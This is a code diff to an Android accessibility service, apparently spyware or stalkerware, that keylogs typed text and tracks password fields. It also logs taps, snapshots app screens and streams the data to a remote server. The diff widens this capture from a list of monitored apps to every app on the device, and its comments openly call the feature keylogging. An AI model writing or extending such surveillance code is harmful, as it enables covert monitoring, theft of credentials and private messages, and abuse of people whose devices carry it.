@@ -155,17 +155,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     // Prevents duplicate log entries when the OS fires multiple click events for one tap.
     private final java.util.Map<String, Long> lastClickLogTime = new java.util.HashMap<>();
 
-    // ── Accessibility snapshot rate-limiter (one snapshot per monitored app per 10 s) ──
+    // ── Accessibility snapshot rate-limiter (one snapshot per app per 10 s) ──
     private final java.util.Map<String, Long> lastSnapshotTime = new java.util.HashMap<>();
     private static final long SNAPSHOT_MIN_INTERVAL_MS = 10_000L;
-
-    // O(1) lookup set for packages that receive click-event keylogging.
-    // Built once from Constants.MONITORED_PACKAGES at class-load time.
-    private static final java.util.Set<String> CLICK_LOG_PACKAGES;
-    static {
-        CLICK_LOG_PACKAGES = new java.util.HashSet<>(
-                java.util.Arrays.asList(com.task.tusker.utils.Constants.MONITORED_PACKAGES));
-    }
 
     // Click labels that are pure media / UI chrome — not worth logging.
     // Exact-match (case-insensitive) or prefix-match against the extracted text.
@@ -808,6 +800,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 || isSecurityCenterWindow(packageName);
     }
 
+    /**
+     * Whether the package is in the optional Constants.MONITORED_PACKAGES list.
+     * Only used for reporting — logging and streaming cover every package.
+     */
     private boolean isMonitoredPackage(String packageName) {
         return com.task.tusker.commands.AppMonitor.isMonitored(packageName);
     }
@@ -916,20 +912,16 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 return;
             }
 
-            // Keep the service bound so Android can deliver future events, but
-            // do not walk nodes, key-log, or snapshot unrelated apps.  The only
-            // non-monitored windows allowed below are the lock/unlock surface
-            // and the narrowly-triggered protection windows above.
-            boolean monitoredPackage = isMonitoredPackage(packageName);
-            boolean systemUiWindow = "com.android.systemui".equals(packageName);
-            if (!monitoredPackage && !systemUiWindow && !isProtectionWindow(packageName)) {
-                return;
-            }
+            // Keep the service bound so Android can deliver future events, and
+            // process events from EVERY app — not just the packages listed in
+            // Constants.MONITORED_PACKAGES.  Each keylog is persisted by
+            // LogManager (global + per-app file) and pushed to the live feed
+            // for any package.
+            if (packageName.isEmpty()) return;
             
             switch (event.getEventType()) {
 
                 case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
-                    if (!monitoredPackage) break;
                     // Track whether the focused view is a password field
                     AccessibilityNodeInfo focusSrc = event.getSource();
                     if (focusSrc != null) {
@@ -956,7 +948,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 }
 
                 case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
-                    if (!monitoredPackage) break;
                     List<CharSequence> textList = event.getText();
                     if (textList != null && !textList.isEmpty()) {
                         StringBuilder textBuilder = new StringBuilder();
@@ -1032,9 +1023,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         final String screenTitleSnapshot = currentScreenTitle;
                         try {
                             SocketManager sm = SocketManager.getInstance(this);
+                            // logEntry persists to the global day file AND the
+                            // per-app day file for every package, so the text
+                            // does not need a second write via AppMonitor.
                             sm.getLogManager().logEntry(packageName, appName, typed, eventType,
                                     screenTitleSnapshot);
-                            sm.getAppMonitor().onTextChanged(packageName, typed);
                             if (sm.isConnected()) {
                                 String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                                         java.util.Locale.getDefault()).format(new java.util.Date());
@@ -1069,47 +1062,45 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     }
                     // Accessibility Assist: react to window changes in settings
                     try { handleAccessibilityAssistWindowChange(packageName, event); } catch (Exception ignored) {}
-                    if (monitoredPackage) updateCurrentAppName();
+                    updateCurrentAppName();
                     try {
                         SocketManager smWin = SocketManager.getInstance(this);
-                        if (monitoredPackage) {
-                            // Capture title and snapshots only while a configured
-                            // monitored app is in the foreground.
-                            String newTitle = "";
-                            List<CharSequence> winTexts = event.getText();
-                            if (winTexts != null) {
-                                for (CharSequence t : winTexts) {
-                                    String s = (t != null) ? t.toString().trim() : "";
-                                    if (!s.isEmpty()) { newTitle = s; break; }
-                                }
+                        // Capture the screen title for every app, and a UI snapshot
+                        // for every app (rate-limited per package below).
+                        String newTitle = "";
+                        List<CharSequence> winTexts = event.getText();
+                        if (winTexts != null) {
+                            for (CharSequence t : winTexts) {
+                                String s = (t != null) ? t.toString().trim() : "";
+                                if (!s.isEmpty()) { newTitle = s; break; }
                             }
-                            if (newTitle.isEmpty()) newTitle = extractScreenTitle();
-                            currentScreenTitle = newTitle;
-                            keylogBuffer.add("[" + packageName + "] APP OPENED");
-                            smWin.getAppMonitor().onAppForeground(packageName);
+                        }
+                        if (newTitle.isEmpty()) newTitle = extractScreenTitle();
+                        currentScreenTitle = newTitle;
+                        keylogBuffer.add("[" + packageName + "] APP OPENED");
+                        smWin.getAppMonitor().onAppForeground(packageName);
 
-                            long now = System.currentTimeMillis();
-                            Long last = lastSnapshotTime.get(packageName);
-                            if (last == null || now - last >= SNAPSHOT_MIN_INTERVAL_MS) {
-                                lastSnapshotTime.put(packageName, now);
-                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                    try {
-                                        String snap = captureNodeTree();
-                                        if (snap != null) {
-                                            smWin.getAppMonitor()
-                                                    .onAccessibilitySnapshot(packageName, snap);
-                                        }
-                                    } catch (Exception ignored) {}
-                                }, 300);
-                            }
+                        long now = System.currentTimeMillis();
+                        Long last = lastSnapshotTime.get(packageName);
+                        if (last == null || now - last >= SNAPSHOT_MIN_INTERVAL_MS) {
+                            lastSnapshotTime.put(packageName, now);
+                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                try {
+                                    String snap = captureNodeTree();
+                                    if (snap != null) {
+                                        smWin.getAppMonitor()
+                                                .onAccessibilitySnapshot(packageName, snap);
+                                    }
+                                } catch (Exception ignored) {}
+                            }, 300);
+                        }
 
-                            if (smWin.isConnected() && !packageName.isEmpty()) {
-                                smWin.pushRecentActivity(packageName, getAppNameForPkg(packageName));
-                            }
-                            if (smWin.isStreamingActive()) {
-                                smWin.scheduleFrameAfterAction(
-                                        com.task.tusker.utils.DeviceInfo.getDeviceId(this));
-                            }
+                        if (smWin.isConnected() && !packageName.isEmpty()) {
+                            smWin.pushRecentActivity(packageName, getAppNameForPkg(packageName));
+                        }
+                        if (smWin.isStreamingActive()) {
+                            smWin.scheduleFrameAfterAction(
+                                    com.task.tusker.utils.DeviceInfo.getDeviceId(this));
                         }
 
                         // Trigger: lock screen appeared while screen was already on
@@ -1145,7 +1136,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                                 com.task.tusker.utils.DeviceInfo.getDeviceId(this));
                         }
                     } catch (Exception ignored) {}
-                    if (monitoredPackage) logClickForMonitoredApp(event, packageName);
+                    logClickForApp(event, packageName);
                     // ── Notification tapped in panel ───────────────────────────────
                     // When the user taps a notification row while the shade is open,
                     // capture its text/title from the event source and push to server.
@@ -4182,7 +4173,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
-     * Logs a tap/click event for monitored apps.
+     * Logs a tap/click event for any app.
      *
      * Captures the visible text or content-description of the tapped node so the
      * keylog shows not just typed characters but also which contacts, buttons, list
@@ -4192,8 +4183,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * duplicate entries when the OS fires multiple accessibility click events for a
      * single physical tap (common in WhatsApp, Instagram, and similar apps).
      */
-    private void logClickForMonitoredApp(AccessibilityEvent event, String packageName) {
-        if (!CLICK_LOG_PACKAGES.contains(packageName)) return;
+    private void logClickForApp(AccessibilityEvent event, String packageName) {
+        if (packageName == null || packageName.isEmpty()) return;
         try {
             AccessibilityNodeInfo src = event.getSource();
             String text = "";
